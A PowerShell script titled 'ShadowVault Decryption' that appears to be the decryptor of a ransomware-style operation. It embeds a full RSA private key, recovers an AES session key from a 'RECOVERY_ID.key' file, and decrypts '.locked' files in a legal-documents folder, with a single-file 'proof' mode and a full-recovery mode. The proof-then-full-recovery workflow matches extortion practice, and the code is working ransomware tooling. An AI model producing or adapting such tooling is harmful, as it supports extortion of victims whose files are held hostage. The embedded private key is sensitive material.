# =============================================================================
#  SHADOWVAULT DECRYPTION
#  Recovery of the proof file or full return of data. 
#  Uses RSA Private Key to extract AES Key and decrypt.
#  USAGE:
#    1. Single File (Proof): .\shadowvault_dec.ps1 -File "Name.docx.locked"
#    2. Full Recovery:       .\shadowvault_dec.ps1
# =============================================================================

# --- PARAMETERS ---
param(
    [string]$File = $null
)

# --- CONFIGURATION ---
$targetDir = "C:\Users\Public\Documents\Legal_Files"
$sessionKeyPath = "$targetDir\RECOVERY_ID.key"

# --- [!] PASTE ALICE'S PRIVATE KEY HERE ---
$AlicePrivateKeyXML = @"
<RSAKeyValue><Modulus>tBpS3qBGHVRDeHutUUwdO5zxi0N1XmZEPTZQ9QAFzQUbgHmRbUSTj92fS62/n4peuNVxbWZTJbW91DVP8i5i8L75c7HCJO/OQYYA30Rz9imB8ONJikD/zuPcwi6+lqFmQ2Yq8F8SaiWa9v9Cdk30F1CFMiHDBHijg1EQ1rammJFP8KlMluhkRp5L/vPAaAre4+yhawWG3FJWhDZJdolTw4k8a+bqfP8ZE9FGOgoVlFI/wj4jmQGEXKrVu1AOHzKJPhs9aVn3AsQVUDA9sSF5ZqnOgyf4xGk5nOxH0u1p9ucRFb9dHAcM8tO0nLbTKFhiDi+uBgNx18MJ56Dz7NJNLQ==</Modulus><Exponent>AQAB</Exponent><P>3iZpPf49NTliaM0uE5g5mb6xS3Ew11YKyCOqEnXAfxD9si3hK984W/LZ8RrV+jYju0xl+FRxlu6U6RUizy3BM8vYy+gBV+awldlgKHebD7L37fN158UU0dPlmODtNcQazhGySDBWcrDzkndH149Nj2Ku3QM1C9XsASAvBJXGLSs=</P><Q>z4u+C1kNeS/kfO07gFum28EN+zbcLvma0mkL11E1Sjh7FDH5efYCawyj8AQW+tHgpbi+n44siGN+z1KRXs2+5NRJmWp6y12QImzzvD4jz0wmxHoPtghTvgIM6HtGqkHCBcq8iAo0QMO1X1QUcDA1HveB8sS8sQQnBMQqFdN2swc=</Q><DP>Qddgmd8ghQXdBPLLFUOozsiWA6Yos6nsyCTJ427C/uYqSwUOF9KxAY+YyL0Lbn1dWcXq8w8UG4fa2rpI9t64xIFGYCkDPOpCrCchON06OAzzLrNZ3req1AXZptYDeEwHJcxY6sxo0tVfW6m+wUTX2AeHjDnHHxroN+0yAknh0sE=</DP><DQ>N6hK+7IS+efNB297IG3zrkT0YeURYQuQ6FJBWamud8vzvbO1Km69sUV/hTMjknnMG8USYal36c98x05mK51TTvxbDGhQq87Yg1Lifh3P7pyGXPQ62F8dTfwwx/ufNLNTu8fljTnnT2LsdbcPkBJtfHN1hswZqgLqD84nVxkRYOs=</DQ><InverseQ>cgY2nmWv0TZt2Y8wEoktH9KXvCJrAk5b60Cfz5bBZUnrk9qFABjKMeiagK9fzV/bjofW+nmdQNIwcaV6cFJ9QUu3nYctcy7yv+/lLzEsjMFnLx1uY0afsHXJupGB536NQGse9MbaUcp/aW6WPwbOKyaM2j6t5OmY9WNFYQz5zC0=</InverseQ><D>Du4zuoL87QeERGO0XY36ymtbVtkzzKybsZtkILtsv69RtVfep3lM5ltQDl0MCrTU32vKaHBYKkMjxojY5NHVn/GlCmNNHfTHW4U5Y0jweBK+0/JzsUNsMYGQVoS7hg9BRAsfOigXhbcyXpGQt/AEcT5anGpSGXfKzmMVC0e/DdyybY4nqMlxPzU0pC/0OXkenZBo+srRFVhoiL8ar5qCm1XsA1mtA19yEn9LXXEPtrHp6jFI9MjOoo8efkTo0uzDC0WK3HJtUFjhiKS8t7JX7IeKv3xjICDs8jLYshT1i4b2xl6YH0VIwf3XgrWH4xv8NsrFL84V/AXwfzkgnhjwHQ==</D></RSAKeyValue>
"@

# Load libraries
Add-Type -AssemblyName System.Security

# 1. Recover AES key
# Use Alice's Private Key to extract the AES key.
Write-Host "[*] Initializing file recovery..." -ForegroundColor Cyan
if (!(Test-Path $sessionKeyPath)) {
    Write-Error "CRITICAL ERROR: 'RECOVERY_ID.key' not found."
    exit
}

try {
    $encryptedBlob = [System.IO.File]::ReadAllBytes($sessionKeyPath)
    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
    $rsa.FromXmlString($AlicePrivateKeyXML)
    $decryptedBlob = $rsa.Decrypt($encryptedBlob, $false)
    
    # Extract IV and key
    $recoveredIV = $decryptedBlob[0..15]
    $recoveredKey = $decryptedBlob[16..47]
    Write-Host "[+] AES Key recovered." -ForegroundColor Green
} catch {
    Write-Error "Private Key mismatch."
    exit
}

# 2. Decrypt fucntion
function Decrypt-File {
    param($Path, $Key, $IV)
    $name = Split-Path $Path -Leaf
    
    try {
        # Configure AES
        $aes = New-Object System.Security.Cryptography.RijndaelManaged
        $aes.KeySize = 256; $aes.BlockSize = 128
        $aes.Key = $Key; $aes.IV = $IV
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $decryptor = $aes.CreateDecryptor()
        
        # Read -> Decrypt -> Write
        $bytes = [System.IO.File]::ReadAllBytes($Path)
        
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($bytes, 0, $bytes.Length)
        $cs.FlushFinalBlock()
        
        $originalName = $Path.Replace(".locked", "")
        [System.IO.File]::WriteAllBytes($originalName, $ms.ToArray())
        
        # Cleanup
        $cs.Close(); $ms.Close(); $aes.Clear()
        
        # Delete Locked File
        Remove-Item -LiteralPath $Path -Force
        
        Write-Host " -> Restored: $name" -ForegroundColor Green
    } catch {
        Write-Host " [!] Failed: $name" -ForegroundColor Red
    }
}

# 3. Execution logic
Write-Host ""
$filesToProcess = @()

if ($File) {
    Write-Host "--- SINGLE FILE DECRYPTION MODE ---" -ForegroundColor Yellow
    if (-not $File.EndsWith(".locked")) { $File = "$File.locked" }
    
    $fullPath = Join-Path -Path $targetDir -ChildPath $File
    
    if (Test-Path -LiteralPath $fullPath) {
        $filesToProcess += $fullPath
    } else {
        Write-Error "File not found: $File"
    }

} else {
    Write-Host "--- FULL SYSTEM RECOVERY MODE ---" -ForegroundColor Cyan

    $filesToProcess = Get-ChildItem -Path $targetDir -Filter "*.locked" | ForEach-Object { $_.FullName }
}

if ($filesToProcess.Count -gt 0) {
    foreach ($filePath in $filesToProcess) {
        Decrypt-File -Path $filePath -Key $recoveredKey -IV $recoveredIV
    }
    Write-Host "`n[*] Done." -ForegroundColor Cyan
} else {
    Write-Warning "No files found to decrypt."
}